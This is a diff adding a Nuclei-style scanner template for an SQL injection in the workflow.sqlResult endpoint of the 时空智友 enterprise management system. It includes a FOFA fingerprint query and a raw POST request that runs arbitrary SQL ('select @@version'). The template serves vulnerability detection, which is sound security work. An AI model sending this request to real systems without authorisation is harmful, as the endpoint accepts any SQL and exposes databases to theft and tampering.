@@ -1,0 +1,35 @@
+id: shikong-zhiyou-sql-injection
+
+info:
+  name: "时空智友企业信息管理系统 workflow.sqlResult 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="时空智友企业信息管理"
+      时空智友企业信息管理系统中 workflow.sqlResult 接口未正确过滤用户输入的SQL语句参数，导致攻击者可通过构造恶意请求注入任意SQL代码，实现数据库敏感信息获取、数据篡改或权限提升等攻击行为。
+  tags: 时空智友企业信息管理系统
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=workflow.sqlResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+
+        {
+          "params": {
+            "hello": "world"
+          },
+          "sql": "select @@version"
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - 'Microsoft SQL Server'
+        condition: and
+      - type: status
+        status: 
+          - 200
